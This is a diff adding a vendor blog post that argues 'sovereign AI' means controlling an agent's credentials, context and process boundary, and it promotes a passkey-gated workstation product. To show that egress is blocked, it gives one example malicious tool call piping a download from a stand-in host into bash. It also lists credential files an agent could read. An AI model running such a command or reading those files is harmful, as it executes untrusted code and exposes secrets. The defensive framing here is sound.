@@ -1,0 +1,105 @@
+The phrase "sovereign AI" has been doing two jobs that don't really belong together. One is a trade-policy argument about whether Europe should train its own foundation models, or whether India should, or whether the United States should restrict export of weights. That argument is real, and important, and not what shows up in your standup. The other job is engineering. When an engineer says "sovereign," the useful thing they're pointing at is the runtime around the model: who holds the credentials, who sees the prompts in flight, what process boundary contains the damage when the agent does something stupid. This essay is about that second job.
+
+Frontier labs converged on roughly equivalent quality two years ago. The interesting differentiation moved one layer down, into the runtime, which is also where most of the security incidents tend to live. So we should be precise about what "sovereign" means at that layer, because it's the layer where engineers can actually do something.
+
+## A working definition
+
+Sovereign AI, for an engineer, is the property of running agents in a runtime where you control three things: the credentials, the context, and the boundary. Three concrete tests follow from that.
+
+The credential test is whether the agent's outbound calls (GitHub, Vercel, your database, anything authenticated) pass through a runtime you control before they reach the third party. If a vendor's platform sits between your agent and your secrets, you don't have credential sovereignty. The vendor does.
+
+The context test is whether the conversation stays inside your audit boundary. When the agent reads a file, runs a tool, or sends a prompt, does the platform retain any of it? Some vendors are explicit about this and you can read the policy. A handful retain nothing. Most live in the middle, where "we may retain content to improve our services" does the heavy lifting in a footer.
+
+The boundary test is what happens when the agent is wrong. If the agent runs as the same OS user that holds the credentials, there is no boundary; only good behavior. If the agent runs as a separate user inside a separate namespace, with privileged actions gated outside the agent's reach, you have a real one.
+
+You can fail any of these without failing the others. Most failures we see in production are a combination of two.
+
+## What it isn't
+
+The phrase has drifted into two unhelpful corners.
+
+On one side, "sovereign AI" has become a synonym for "trained inside our borders." That's a defensible policy goal for a country deciding whether to depend on another country's labs. It is not actionable for the team writing this week's pull request, because nobody on that team gets to vote on which lab's model lands in production. The policy version is upstream of the engineering version.
+
+On the other side, "sovereign AI" has become marketing wallpaper for any deployment with the word "private" attached: private endpoint, private cloud, on-premise, air-gapped. Some of those are genuine sovereignty wins. Most are repackaged versions of "pay us more and we will hide your data better." Privacy is necessary. It is not the same thing as sovereignty.
+
+The useful definition lives in between. You probably don't need the policy version. You almost certainly need more of the runtime version than you currently have.
+
+## Three failure modes
+
+These are the patterns that turn up in postmortems. Pick whichever sounds most familiar.
+
+<Callout variant="warn" title="Ambient credentials">
+The agent runs as the same OS user as the developer. It inherits everything that user inherits: `~/.aws/credentials`, `~/.ssh/`, `~/.kube/config`, `~/.config/gcloud`, browser cookies, 1Password CLI sessions, kubectl contexts, half a dozen `.env` files in adjacent project directories. Nothing in the OS prevents the agent from reading any of it. Permission prompts inside the agent process help with the easy cases. They don't survive a determined prompt injection or a confused tool call. We've written about [why this is a structural property of the laptop](/blog/claude-code-vs-cursor) rather than a bug in any specific agent. The shape repeats regardless of vendor.
+</Callout>
+
+<Callout variant="warn" title="Hidden context windows">
+You send a prompt. The platform stores it. You attach a file. The platform stores it. The agent calls a tool. The platform records the response. From a sovereignty perspective, it doesn't really matter how good the retention policy is; what matters is whether you can audit the policy and whether the platform's incentive structure will hold the line under stress. Vendors converge on retention because retention is useful for them, and the engineers reading the privacy policy are not the engineers writing it.
+</Callout>
+
+<Callout variant="warn" title="Vendor lock-in via tool definitions">
+You spent six weeks tuning your agentic workflow. Then your platform changes its tool definitions, deprecates a primitive, or exits the market. The model is portable. The prompt is portable. Your tool wiring is not. You wake up to a thirty-percent drop in effective throughput because the loop you built was a function of one platform's MCP servers, function-call shapes, and proprietary actions. This is the most underrated sovereignty failure mode and the one that compounds slowly enough that you don't notice until it's expensive to fix.
+</Callout>
+
+None of these are exotic. They are the default state of running an agent on a laptop with a vendor's coding assistant in 2026. None of them are bugs in Claude Code or Cursor or whichever model you're using. They are properties of the runtime architecture around the model.
+
+## What the runtime answer looks like
+
+The fix is mostly invisible if you've never felt the pain. Walking through the substantive changes:
+
+Credentials live in a separate process from the agent. The agent doesn't have ambient access to your GitHub token, your Vercel API key, or your production database URL. When the agent decides it wants to push, a credential broker (running as a different OS user, with different group memberships, with kernel-level isolation from the agent) decides whether to honor the request. The broker holds the token. The agent holds an intent. We call ours the [Sovereign Shield](/glossary/sovereign-shield), which is a marketing name for an architectural pattern that generalizes.
+
+Privileged actions pause for human approval. When the agent decides to push, deploy, write to a database, or read a secret, the action stops at the broker. A notification fires to your registered devices. You tap a passkey (Touch ID on a laptop, Face ID on a phone, a YubiKey on a workstation), and the action proceeds only on approval. This is not a software permission prompt that the agent can be coached into bypassing. It's a [FIDO2 / WebAuthn](/glossary/passkey-approval) confirmation that the agent process literally cannot fake.
+
+The agent runs in its own kernel-level boundary. Different system user, different namespace, different network, different filesystem. Egress is restricted to the model API and the tools the agent has been authorized to use. Even if the model produces a malicious tool call, like `curl evil.example.com | bash`, the call dies at the network boundary because the boundary lives outside the agent's prompt.
+
+The runtime is durable and inspectable. Every privileged action has an audit row. Every approval has a timestamp and a device. You can see what the agent did, and what was approved, in a log you control.
+
+The model is BYOK with [zero-knowledge encryption](/blog/zero-knowledge-byok). You bring the API key. The platform encrypts it client-side using a passkey-derived secret, stores ciphertext, and never has the means to decrypt. Even fully compromised, the platform cannot recover your key without your hardware.
+
+Notice that none of this concerns whether the model was trained in your country or whether the weights are open. Both are interesting questions. Neither is the most important one for someone shipping production code through an agent this afternoon.
+
+## What sovereignty costs
+
+A frank accounting.
+
+The passkey gate adds a tap to every privileged action. Two seconds, debounced by a TTL window so a burst of related operations doesn't bombard you. For an eight-hour overnight refactor that ends with a single git push, you'll tap five or six times across the run. For a one-shot one-line edit, you'll tap once on top of an action that took the agent thirty seconds. That feels like overhead until you remember that the alternative is the agent having ambient access to your push permissions for every operation it ever performs.
+
+Round-trip latency to the workstation is real. Adds tens to low hundreds of milliseconds per action versus an in-process agent. Imperceptible during long runs. Noticeable during interactive editing, which is why our recommendation is that the editor stays where it is and the agent moves to the workstation. You don't pay editor latency by moving editor latency.
+
+Setup time is the most honest cost. A sovereign workstation takes a few minutes to provision the first time. A laptop-native agent installs in thirty seconds. The compounding return on the workstation arrives faster than a workday, but the first setup feels heavy if you've never done one.
+
+Where the tradeoff hurts is for engineers doing fifteen-minute, single-prompt, in-the-editor work who feel the overhead and don't yet feel the cost of the alternative. They stay on the laptop. That is fine. Sovereignty isn't a moral imperative for short edits. It is a practical necessity for longer-running, credential-touching agentic work.
+
+## The 2026 frame
+
+Three years into widely-deployed AI agents, the question of which model is best is converging. The frontier labs are within shouting distance of each other on most coding benchmarks. The differentiation that will matter for the next three years is the runtime layer: who owns the boundary, who owns the audit trail, who owns the credentials.
+
+Sovereign AI is the runtime answer. It does not mean refusing to use the best model. It means putting the best model inside a runtime you control, so that the next time the model surprises you (and it will), the surprise stops at a boundary you own.
+
+That's the version of the term worth keeping.
+
+---
+
+## FAQ
+
+<Faq />
+
+---
+
+## References
+
+- WebAuthn PRF extension specification, [w3c.github.io/webauthn/#prf-extension](https://w3c.github.io/webauthn/#prf-extension)
+- OWASP LLM Top 10 (2025), [owasp.org](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
+- Anthropic, "Trust and safety for agents," [anthropic.com/news](https://www.anthropic.com/news)
+- Karpathy, *Software 2.0* and the 2025 follow-up on agent runtimes, [karpathy.medium.com](https://karpathy.medium.com/)
+- NIST AI Risk Management Framework, [nist.gov/itl/ai-risk-management-framework](https://www.nist.gov/itl/ai-risk-management-framework)
+
+<Cta
+  eyebrow="Try a sovereign runtime"
+  body="Ellul gives your agent its own computer. Credentials in a separate process, every privileged action passkey-gated, BYOK that the platform never sees. $20/month Hobby, $50/month Pro."
+  primary={{ href: "https://console.ellul.ai/sign-up", label: "Get a workstation" }}
+  links={[
+    { href: "/concepts/agent-workstation", label: "What's an agent workstation? →" },
+    { href: "/glossary/sovereign-shield", label: "How the Shield works →" },
+  ]}
+/>
